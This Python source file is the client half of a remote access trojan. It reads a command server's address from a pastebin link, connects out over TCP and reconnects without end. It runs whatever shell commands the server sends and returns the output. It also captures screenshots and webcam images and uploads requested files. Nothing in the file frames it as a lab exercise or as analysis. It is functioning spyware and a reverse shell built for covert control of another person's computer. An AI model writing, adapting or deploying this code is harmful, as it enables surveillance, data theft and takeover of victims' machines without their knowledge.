import socket                                         #To create TCP sockets
import subprocess                                     #To execute commands
from os import chdir,getcwd,path,remove               # To use some OS commands like changing directries 
from time import sleep                                # Sleep function
#import tempfile                                      # i wanted to store all data used in temp file
from PIL import Image                                 #Picture manipulation
from requests import get                              #To get url raw content
from cv2 import VideoCapture,imwrite                  #For Snapshots
from mss import mss                                   #For taking screenshots

#-----This function gets HOST and PORT from a raw-data URL -----#
def getHostPort(link):
    r = get(link)                            # Response will be stored from url
    content = r.text                                  # Raw text from url
    content=content.split(' ')
    return content

#-----This function creates socket and gets HOST and PORT -----#
def socket_create():
    global host
    global port
    global s
    try:
        host = hostFromURL
        port = portFromURL
        #host='192.168.0.100'             #Uncomment this to type your local IP address manually
        #port=9999                        #Uncomment this to type your port manually
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    except:
        sleep(3)
        socket_create()

#-----This function connects the socket to the server using HOST and PORT  -----#
def socket_connect():
    try:
        global host
        global port
        global s
        s.connect((host, port))
    except socket.error as msg:
        #print("Socket connection error: " + str(msg) + "\n" + "Retrying ...")
        sleep(3)
        socket_connect()

#-----This function try to reconnect to the server anytime -----#
def socket_reconnect(s):
    s.close()
    sleep(2)
    socket_create()
    socket_connect()

#-----This function is used to recieve all kind of commands sent by the server -----#
def receive_commands():
    global s
    global directoryy
    while True:
        data=s.recv(4096)
        data=data.decode("utf-8")
        
        if data[:2] == 'cd':     #This condition is for changing directory if the server sent a changing directory command like 'cd ..' 
            try:
                chdir(data[3:])
                directoryy=getcwd()
                cmd = subprocess.Popen(data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, "windows-1252")
                s.send(str.encode(output_str + str(getcwd())))
            except:
                s.send(str.encode("No such file or directory\n"))

        elif data == 'screenshot':
                s.send(str.encode('captured'))
                send_screenshot()

        elif data == 'camera':
                send_camera()

        elif data== 'download' :
            filename=path.join(directoryy,str(s.recv(4096),"utf-8"))
            if path.isfile(filename):
                s.send(str.encode('captured'))
                send_file(filename)
            else:
                s.send(str.encode("You wrote the name file incorrectly"))

        elif data == 'quit':
            socket_reconnect(s)

        elif len(data) > 0:
            cmd = subprocess.Popen(data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "windows-1252")
            s.send(str.encode(output_str + str(getcwd())))
    
    s.close()

#-----Sending a screenshot to the server-----#
def send_screenshot():
    try:
        with mss() as sct:
            sct.shot()
        #im.save(path.join(tempfile.gettempdir(), "screen.jpg") )
        #f=open(path.join(tempfile.gettempdir(), "screen.jpg") ,'rb')
        #im.save("screen.jpg")
        f=open("monitor-1.png" ,'rb')
        i=f.read(4096)
        while i:
            s.send(i)
            i=f.read(4096)
        s.send(str.encode('complete'))
        f.close()
        remove("monitor-1.png")
    except socket.error as mess:
        print('something wrong in client' + str(mess))

#-----Sending a webcam-shot to the server-----#
def send_camera():
    try:
        cam = VideoCapture(0)
        if cam is None or not cam.isOpened():
            s.send(str.encode('non captured'))
        else:
            s.send(str.encode('captured'))
            ret, im= cam.read()
            #imwrite(path.join(tempfile.gettempdir(), "cam.jpg"),im)
            #f=open(path.join(tempfile.gettempdir(), "cam.jpg"),'rb')
            imwrite("cam.jpg",im)
            f=open("cam.jpg",'rb')
            i=f.read(4096)
            while i:
                s.send(i)
                i=f.read(4096)
            s.send(str.encode('complete'))
            f.close()
            remove("cam.jpg")
    except socket.error as mess:
        print('something wrong in client' + str(mess))

#-----Sending the desired file to the server-----#
def send_file(filename):
    try:
        f=open(str(filename),'rb')
        i=f.read(4096)
        while i:
            s.send(i)
            i=f.read(4096)
        s.send(str.encode('complete'))
        f.close()
    except socket.error as mess:
        print('something wrong in client' + str(mess))

#-----The MAIN Function -----#
def main():
    socket_create()
    socket_connect()
    receive_commands()

######################################################################################################################

directoryy=getcwd()   #To store current directory
url='https://pastebin.com/raw/xTBFbz6V' # Here u can put your URL that contains -host and port- server as raw data split by spacebar ('192.168.0.2 7777' for exemple)
hostFromURL=getHostPort(url)[0]
portFromURL=int(getHostPort(url)[1])

main()
